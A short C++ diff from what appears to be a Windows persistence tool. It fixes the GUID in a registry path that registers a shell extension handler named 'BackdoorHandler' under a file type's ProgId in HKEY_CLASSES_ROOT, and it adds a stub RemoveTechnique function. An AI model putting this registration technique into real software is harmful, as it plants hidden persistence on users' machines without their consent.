@@ -378,7 +378,7 @@ namespace reg {
 
 				strExt = std::wstring(ext);
 				progId = ResolveProgId(strExt.c_str());
-				progId.append(L"\\shellex\\E357FCCD-A995-4576-B01F-234630154E96}\\BackdoorHandler");
+				progId.append(L"\\shellex\\{E357FCCD-A995-4576-B01F-234630154E96}\\BackdoorHandler");
 				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
 				if (hkResult) {
 
@@ -574,6 +574,11 @@ namespace reg {
 		}
 
 		
+	}
+
+	BOOL RemoveTechnique(BYTE type, WCHAR* ext)
+	{
+		return 0;
 	}
 	
 	BOOL RemoveTechnique(DWORD type, WCHAR* ext) {
